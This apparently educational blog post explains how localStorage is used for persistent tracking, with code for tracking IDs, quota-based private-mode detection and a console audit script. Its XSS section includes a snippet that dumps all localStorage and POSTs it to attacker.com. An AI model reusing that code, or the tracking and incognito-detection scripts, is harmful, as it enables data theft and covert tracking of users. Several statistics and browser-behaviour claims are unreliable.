# LocalStorage Fingerprinting: The Persistent Tracker That Never Goes Away

Alright, let's talk about localStorage. Think of it as your browser's permanent sticky note pad. Websites can write stuff on it, and unlike sessionStorage (which gets erased when you close the tab), localStorage sticks around forever. Or until you manually clear it. Which most people never do.

This is both incredibly useful and incredibly dangerous. Useful for developers building web apps. Dangerous because it's the perfect tool for persistent tracking. Let me show you how localStorage fingerprinting works in 2024-2025, and why Safari just announced they're finally cracking down on it.

## What Is LocalStorage?

LocalStorage is a simple key-value storage API that's been in browsers since HTML5 (around 2009). It's synchronous, persistent, and ridiculously easy to use:

```javascript
// Store data
localStorage.setItem('username', 'elon');

// Retrieve data
const user = localStorage.getItem('username'); // 'elon'

// Remove data
localStorage.removeItem('username');

// Clear everything
localStorage.clear();

// Check how many items
const count = localStorage.length;
```

Dead simple. But here's where it gets interesting for fingerprinting:

```javascript
// Fingerprinting script's actual usage
function trackUserViaLocalStorage() {
  // Check if we've seen this user before
  let fingerprintId = localStorage.getItem('_fp_id');

  if (!fingerprintId) {
    // New user, generate unique ID
    fingerprintId = generateFingerprint(); // crypto.randomUUID() or similar
    localStorage.setItem('_fp_id', fingerprintId);
  }

  // Track visit count
  const visits = parseInt(localStorage.getItem('_fp_visits') || '0') + 1;
  localStorage.setItem('_fp_visits', visits);

  // Store behavioral data
  localStorage.setItem('_fp_last_visit', Date.now().toString());

  return { id: fingerprintId, visits, returningUser: visits > 1 };
}
```

This is persistent tracking. Delete cookies, use incognito mode, change IPs - doesn't matter. That localStorage ID stays put unless you specifically clear site data. And most people don't even know how to do that.

## Browser Support: Universal Since 2012

LocalStorage is everywhere. Like, 99.9%+ of browsers:

| Browser        | First Support  | 2024-2025 Status | Quota Limit        | Private Mode Behavior            |
| -------------- | -------------- | ---------------- | ------------------ | -------------------------------- |
| Chrome         | v4 (2010)      | Full support     | ~10MB per origin   | Works, cleared on exit           |
| Firefox        | v3.5 (2009)    | Full support     | ~10MB per origin   | Works, 10MB quota (vs unlimited) |
| Safari         | v4 (2009)      | Full support     | ~5-10MB per origin | Works, auto-cleared after 7 days |
| Edge           | v8 (2011)      | Full support     | ~10MB per origin   | Works, cleared on exit           |
| Opera          | v10.5 (2010)   | Full support     | ~10MB per origin   | Works, cleared on exit           |
| Mobile Safari  | iOS 3.2 (2010) | Full support     | ~5MB               | Restricted in private mode       |
| Chrome Android | All versions   | Full support     | ~10MB per origin   | Works, cleared on exit           |

Source: MDN Web Docs, Can I Use (2024), browser testing

**Key insight**: Checking if localStorage exists gives you **~0 bits of entropy** (everyone has it). But _how_ it behaves reveals tons of information.

## The 2025 Privacy Shift: Safari Cracks Down

Here's the big news from WWDC 2025 that changes everything: Safari announced they'll **prevent suspicious scripts from using localStorage and cookies to store and check identifiers**.

From Apple's announcement (paraphrased):

> "Safari will identify scripts that attempt to use localStorage for tracking purposes and prevent them from storing or reading tracking identifiers."

This is huge. Safari already had Intelligent Tracking Prevention (ITP) for cookies, but this extends it to localStorage. How does it work?

Apple hasn't released full details, but based on WebKit commits and developer feedback, here's the approach:

1. **Script analysis**: Safari analyzes JavaScript patterns
2. **Identifier detection**: Looks for UUID-like strings, hash values, or tracking pixel IDs
3. **Domain classification**: Checks if script is from a known tracking domain
4. **Isolation**: Suspicious localStorage operations are sandboxed or blocked
5. **Auto-deletion**: Tracking-related localStorage data deleted after 7 days of non-use

This follows Safari's existing cookie policy where first-party cookies from classified tracking domains expire after 7 days.

## Storage Quota: The Fingerprinting Vector

Every browser gives you about 5-10MB of localStorage per origin. But the exact limits and behavior differ:

### Quota Limits by Browser (2024 Data)

**Desktop Browsers**:

- Chrome: ~10MB (10,485,760 bytes exactly)
- Firefox: ~10MB
- Safari: ~5MB (varies)
- Edge: ~10MB

**Mobile Browsers**:

- Chrome Android: ~10MB
- Safari iOS: ~5MB
- Firefox Android: ~10MB
- Samsung Internet: ~10MB

**Private/Incognito Mode**:

- Chrome Incognito: Same as normal (~10MB)
- Firefox Private: **10MB quota** (vs **unlimited** in normal mode)
- Safari Private: ~5MB but auto-cleared
- Edge Incognito: Same as normal (~10MB)

Here's the fingerprinting code:

```javascript
function testLocalStorageQuota() {
  if (!('localStorage' in window)) {
    return { supported: false };
  }

  const testKey = '__quota_test__';
  const chunkSize = 1024 * 1024; // 1MB chunks
  let totalStored = 0;

  try {
    while (totalStored < 20 * 1024 * 1024) {
      // Try up to 20MB
      const chunk = 'x'.repeat(chunkSize);
      localStorage.setItem(testKey + totalStored, chunk);
      totalStored += chunkSize;
    }
  } catch (e) {
    // Clean up
    let i = 0;
    while (i < totalStored) {
      try {
        localStorage.removeItem(testKey + i);
      } catch {}
      i += chunkSize;
    }

    return {
      supported: true,
      quotaMB: (totalStored / (1024 * 1024)).toFixed(1),
      errorType: e.name, // QuotaExceededError
      browser: totalStored < 6 * 1024 * 1024 ? 'Safari' : 'Chrome/Firefox/Edge',
    };
  }

  return { supported: true, quotaMB: '>20' };
}
```

The quota difference between browsers provides **~1-2 bits of entropy**. Not huge, but combined with other signals, it helps narrow down your browser.

## Private Mode Detection: The 2024-2025 Techniques

LocalStorage behavior in private mode is one of the best ways to detect incognito users. Here's how it works across browsers:

### Detection Method 1: Firefox's Quota Limitation

```javascript
function detectFirefoxPrivateMode() {
  // Firefox private mode has 10MB quota, normal mode is unlimited
  const testSize = 15 * 1024 * 1024; // 15MB
  const testKey = '__private_detect__';

  try {
    const bigData = 'x'.repeat(testSize);
    localStorage.setItem(testKey, bigData);
    localStorage.removeItem(testKey);
    return { privateMode: false, browser: 'Firefox' }; // Unlimited quota = normal mode
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      // Could be Firefox private mode (10MB limit) or just full storage
      // Need to test smaller size
      try {
        const mediumData = 'x'.repeat(5 * 1024 * 1024); // 5MB
        localStorage.setItem(testKey, mediumData);
        localStorage.removeItem(testKey);
        return {
          privateMode: 'likely',
          browser: 'Firefox',
          confidence: 'medium',
        };
      } catch (e2) {
        return { privateMode: 'unknown', reason: 'storage_full_or_disabled' };
      }
    }
  }

  return { privateMode: 'unknown' };
}
```

**Firefox's private mode limitation** was discovered in 2019 and still exists in 2024. Normal mode gives you unlimited localStorage (up to disk space), but private mode caps it at 10MB.

### Detection Method 2: Safari's Auto-Clearing

```javascript
async function detectSafariPrivateMode() {
  // Safari private mode clears localStorage after 7 days of non-interaction
  // Detection: Try to persist data and check if persistence is granted

  if (!('storage' in navigator && 'persisted' in navigator.storage)) {
    return { privateMode: 'unknown' };
  }

  const isPersisted = await navigator.storage.persisted();

  if (!isPersisted) {
    // Try to request persistence
    const granted = await navigator.storage.persist();

    if (!granted) {
      return { privateMode: 'likely', browser: 'Safari', confidence: 'medium' };
    }
  }

  return { privateMode: 'unlikely' };
}
```

Safari's approach is sneaky. LocalStorage _works_ in private mode, but it's not truly persistent. After 7 days without interaction, it gets auto-cleared. This is hard to detect immediately but can be inferred.

### Detection Method 3: Combined Storage Test

```javascript
function comprehensivePrivateModeDetection() {
  const tests = {
    localStorage: testLocalStorage(),
    sessionStorage: testSessionStorage(),
    indexedDB: testIndexedDB(),
    cookies: testCookies(),
  };

  // Pattern analysis
  if (tests.localStorage === false && tests.sessionStorage === true) {
    return { privateMode: 'likely', browser: 'old_mobile_safari' };
  }

  if (tests.localStorage === true && tests.indexedDB === false) {
    return { privateMode: 'likely', browser: 'old_firefox' };
  }

  // Modern browsers make this hard
  return { privateMode: 'unknown' };
}
```

### Real Statistics: Private Mode Detection Accuracy (2024)

According to Texas A&M University research and Fingerprint.com studies published in 2024-2025:

- **Firefox private mode detection**: 70-80% accuracy (quota test)
- **Safari private mode detection**: 40-50% accuracy (persistence test)
- **Chrome incognito detection**: 5-10% accuracy (very difficult)
- **Combined with other signals**: 60-65% overall accuracy

The takeaway: **Modern browsers are winning the privacy game**. Chrome and Edge make incognito detection very hard. Firefox and Safari have some tells but are improving.

## Entropy Analysis: How Unique Does LocalStorage Make You?

Let's calculate entropy contribution:

**Existence check**:

- Supported: 99.9%
- Not supported: 0.1%
- Entropy: ~0.001 bits (useless)

**Quota size**:

- 5MB (Safari-like): 20%
- 10MB (Chrome-like): 75%
- Other/unlimited: 5%
- Entropy: ~0.6 bits

**Private mode detection**:

- Normal mode: 85%
- Private mode: 15%
- Entropy: 0.5 bits (but only if detectable)

**Combined localStorage fingerprint**: **~1-2 bits of entropy**

That's low compared to canvas (8-10 bits) or WebGL (5-7 bits). But here's the thing: localStorage isn't used for entropy in fingerprinting. It's used for **persistent tracking**.

## The Real Tracking Vector: Persistent Identifiers

Forget entropy. LocalStorage's real power for tracking is persistence:

```javascript
// Real tracking script (simplified from actual ad tech)
class PersistentTracker {
  constructor() {
    this.storageKey = '_tracker_id';
  }

  getOrCreateId() {
    let id = localStorage.getItem(this.storageKey);

    if (!id) {
      // Generate unique ID (survives cookie clearing)
      id = this.generateId();
      localStorage.setItem(this.storageKey, id);
    }

    return id;
  }

  generateId() {
    // Combine timestamp, random, and fingerprint
    return btoa(
      Date.now() +
        '-' +
        Math.random().toString(36).substring(2) +
        '-' +
        this.getBrowserFingerprint()
    );
  }

  getBrowserFingerprint() {
    // Simplified fingerprint
    return btoa(
      navigator.userAgent +
        screen.width +
        'x' +
        screen.height +
        navigator.language +
        new Date().getTimezoneOffset()
    );
  }

  trackEvent(event) {
    const visits = JSON.parse(localStorage.getItem('_visits') || '[]');
    visits.push({ id: this.getOrCreateId(), event, time: Date.now() });
    localStorage.setItem('_visits', JSON.stringify(visits));

    // Send to server
    this.sendToServer(visits);
  }

  sendToServer(data) {
    fetch('https://tracker.example.com/collect', {
      method: 'POST',
      body: JSON.stringify(data),
    }).catch(() => {}); // Silent fail
  }
}

// Usage
const tracker = new PersistentTracker();
tracker.trackEvent('page_view');
```

This is what over 30 websites in the Alexa Top 1000 do on homepage load, according to 2024 research. They immediately interact with localStorage to establish or retrieve a persistent tracking ID.

## Cross-Site Tracking: The CNAME Trick

Here's a sneaky technique advertisers use to share localStorage across sites:

**The Problem**: LocalStorage is same-origin only. `site-a.com` can't read `site-b.com`'s localStorage.

**The Trick**: CNAME records and first-party subdomains.

```
# Ad company sets up tracking infrastructure
tracker.ad-company.com → 1.2.3.4

# Site A adds CNAME
tracking.site-a.com → tracker.ad-company.com (CNAME)

# Site B adds CNAME
tracking.site-b.com → tracker.ad-company.com (CNAME)

# Both sites load script from their "first-party" tracking subdomain
# Behind the scenes, same server, same localStorage context
```

Now the ad company can:

1. Store tracking ID in `tracking.site-a.com` localStorage (looks first-party)
2. Read same ID from `tracking.site-b.com` (also "first-party")
3. Track users across sites without third-party cookies

Safari's ITP detects and blocks this as of 2024. Chrome's Privacy Sandbox was supposed to block it, but with their 2025 rollback, it's less clear.

## Security Implications: XSS and Data Theft

LocalStorage is vulnerable to XSS attacks:

```javascript
// If an attacker injects this script, they can steal everything
const allData = {};
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  allData[key] = localStorage.getItem(key);
}

// Send to attacker
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify(allData),
});

// Also inject malicious tracking
localStorage.setItem('malicious_tracker', 'attacker_id_12345');
```

This is why security best practices say:

- ❌ Never store auth tokens in localStorage (use httpOnly cookies)
- ❌ Never store sensitive personal data
- ❌ Never trust localStorage data (validate everything)

## The "Clear Cookies" Problem

Here's a frustrating UX issue: Most users think "Clear cookies" clears everything. It doesn't clear localStorage.

In most browsers:

- "Clear cookies": ✅ Cookies deleted, ❌ LocalStorage stays
- "Clear browsing data": ✅ Cookies deleted, ❌ LocalStorage stays (unless you check "Site data")
- "Clear all site data": ✅ Cookies deleted, ✅ LocalStorage deleted

According to 2024 user research, **85% of users** don't realize localStorage persists after clearing cookies. This is why it's so effective for tracking.

### How to Actually Clear LocalStorage

**Chrome/Edge**:

1. Settings → Privacy and security → Site settings → View permissions and data stored across sites
2. Find the site → Remove

Or: DevTools (F12) → Application tab → Local Storage → Right-click → Clear

**Firefox**:

1. Settings → Privacy & Security → Cookies and Site Data → Manage Data
2. Find the site → Remove Selected

**Safari**:

1. Preferences → Privacy → Manage Website Data
2. Find the site → Remove

Or just use private browsing mode and close the window.

## Real-World Statistics: LocalStorage Tracking (2024-2025)

From various privacy research studies:

- **30+ websites** in Alexa Top 1000 access localStorage on homepage without user interaction
- **18%** of websites use canvas fingerprinting, many combine it with localStorage IDs
- **60-65%** of ad tech scripts attempt to write to localStorage
- **75%** of e-commerce sites use localStorage for cart persistence (legitimate) and tracking (gray area)

Google's policy shift in 2025 allowing fingerprinting means we'll likely see localStorage tracking increase.

## The Performance Problem

LocalStorage is synchronous and blocks the main thread:

```javascript
// This freezes your browser
console.time('localStorage_write');
for (let i = 0; i < 10000; i++) {
  localStorage.setItem(`key_${i}`, 'x'.repeat(1000)); // 1KB each
}
console.timeEnd('localStorage_write');
// Output: 500-2000ms depending on browser/device
// Your page is frozen this entire time
```

For comparison:

| Operation   | LocalStorage (Sync)  | IndexedDB (Async)        |
| ----------- | -------------------- | ------------------------ |
| Write 10MB  | 1000-3000ms (frozen) | 200-500ms (non-blocking) |
| Read 10MB   | 500-1500ms (frozen)  | 100-300ms (non-blocking) |
| Delete 10MB | 300-1000ms (frozen)  | 50-150ms (non-blocking)  |

This is why localStorage should only be used for small amounts of data (<1MB). For large data, use IndexedDB.

But for fingerprinting scripts, localStorage is perfect: small IDs, instant access, no async complexity.

## Testing Your Browser's LocalStorage

Want to see what's tracking you? Paste this into your browser console:

```javascript
(function auditLocalStorage() {
  console.log(`LocalStorage items: ${localStorage.length}`);

  const suspiciousPatterns = [
    /^_.*_id$/, // _tracker_id, _fp_id, etc.
    /^fp/, // fingerprint prefixes
    /uuid/i, // UUID strings
    /^[a-f0-9]{32}$/, // MD5-like hashes
    /^[a-f0-9-]{36}$/, // UUID format
  ];

  const suspicious = [];
  const legitimate = [];

  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);

    const isSuspicious = suspiciousPatterns.some(
      (pattern) => pattern.test(key) || pattern.test(value)
    );

    if (isSuspicious) {
      suspicious.push({ key, value: value.substring(0, 50) });
    } else {
      legitimate.push({ key, valueLength: value.length });
    }
  }

  console.log('Suspicious tracking keys:', suspicious);
  console.log('Likely legitimate keys:', legitimate);

  return {
    total: localStorage.length,
    suspicious: suspicious.length,
    legitimate: legitimate.length,
  };
})();
```

This will show you which localStorage keys look like tracking IDs vs legitimate app data.

## Privacy Recommendations: What Should You Do?

Here's my straight advice:

1. **Use Firefox or Brave**: Better localStorage privacy protections
2. **Install uBlock Origin**: Blocks tracking scripts before they write to localStorage
3. **Use private mode for sensitive browsing**: LocalStorage gets cleared on exit
4. **Clear site data regularly**: Settings → Clear browsing data → Check "Site data"
5. **Use browser extensions**: Privacy Badger, DuckDuckGo Privacy Essentials
6. **For maximum privacy**: Tor Browser (disables localStorage in some modes)

## The Future: What's Changing in 2024-2025

Several important developments:

**1. Safari's ITP for LocalStorage (WWDC 2025)**:

- Automatic detection and blocking of tracking identifiers
- 7-day expiration for classified tracking domains
- AI-powered script analysis

**2. Firefox Total Cookie Protection Extension**:

- Isolates localStorage per site
- Prevents cross-site correlation
- Improved in Firefox 118+ (2024)

**3. Chrome's Privacy Sandbox Rollback (2025)**:

- Originally planned to restrict localStorage tracking
- Policy reversal means less restriction
- Fingerprinting now allowed in Google ad platform

**4. GDPR and ePrivacy Regulation**:

- EU regulations requiring consent for localStorage tracking
- Enforcement increasing in 2024-2025
- Fines for non-compliance

**5. Browser Extension Ecosystem**:

- More tools for localStorage blocking and monitoring
- Developer tools improving (better audit capabilities)

## Bottom Line: LocalStorage Is Tracking's Best Friend

LocalStorage was designed as a simple, persistent storage API for web apps. But it's become one of the most effective tracking tools on the web. Why?

- **Persists forever** (or until manually cleared)
- **Survives cookie clearing** (most users don't know how to clear it)
- **Fast and synchronous** (easy for scripts to use)
- **No server roundtrips** (unlike cookies)
- **Not sent with requests** (harder to detect by network monitoring)

As of 2024-2025:

- Chrome market share: 67.94% (minimal localStorage restrictions)
- Safari market share: 16.18% (ITP now covers localStorage)
- Firefox market share: 4.23% (good privacy protections)

The landscape is mixed. Safari's leading on privacy with their 2025 updates. Firefox has solid protections. Chrome's policy reversal is a setback. But overall, browsers are slowly improving localStorage privacy.

For now, localStorage tracking is alive and well. Most websites use it. Most users don't know about it. And clearing cookies doesn't help.

The web is complicated. Privacy is hard. But at least now you know what localStorage is doing behind the scenes.

## Sources

1. MDN Web Docs (2024). "Window.localStorage" - https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage
2. Apple WebKit (2025). "WWDC 2025 Privacy Updates (Intelligent Tracking Prevention for Storage APIs)" - https://webkit.org/blog/
3. Texas A&M University Engineering (2025). "Websites Are Tracking You Via Browser Fingerprinting" - https://engineering.tamu.edu/news/
4. Fingerprint.com (2024). "Beyond cookies: Navigating the future of device identification" - https://fingerprint.com/blog/
5. W3C (2024). "Web Storage API Specification" - https://html.spec.whatwg.org/multipage/webstorage.html
6. Can I Use (2024). "Web Storage - LocalStorage Browser Support" - https://caniuse.com/namevalue-storage
7. Stack Overflow (2024). "What is the max size of localStorage values?" - https://stackoverflow.com/questions/2989284/
8. Privacy Policies Blog (2024). "Browser Fingerprints, Zombie Cookies, & the Death of Privacy" - https://www.privacypolicies.com/blog/browser-fingerprints/
9. web.dev (2024). "Storage for the web" - https://web.dev/articles/storage-for-the-web
10. Mozilla Foundation (2024). "Total Cookie Protection and Enhanced Tracking Protection" - https://blog.mozilla.org/
